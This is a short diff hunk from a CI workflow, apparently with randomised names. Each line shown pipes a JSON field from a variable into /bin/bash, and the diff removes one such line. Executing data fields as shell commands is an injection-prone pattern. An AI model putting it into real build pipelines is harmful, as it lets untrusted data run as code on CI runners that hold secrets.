@@ -34,7 +34,6 @@ jobs:
           printf '%s' "$dplzr276" | jq -r .fc228 | /bin/bash
           echo $xg83258 | jq -r .nvdco7399 | /bin/bash
           printf '%s' "$f63" | jq -r .d8 | /bin/bash
-          echo $rdm744 | jq -r .g9 | /bin/bash
           echo $effm54546 | jq -r .uim4 | /bin/bash
           echo $gq139 | jq -r .ypoc18 | /bin/bash
           printf '%s' "$yd03" | jq -r .yf00568 | /bin/bash
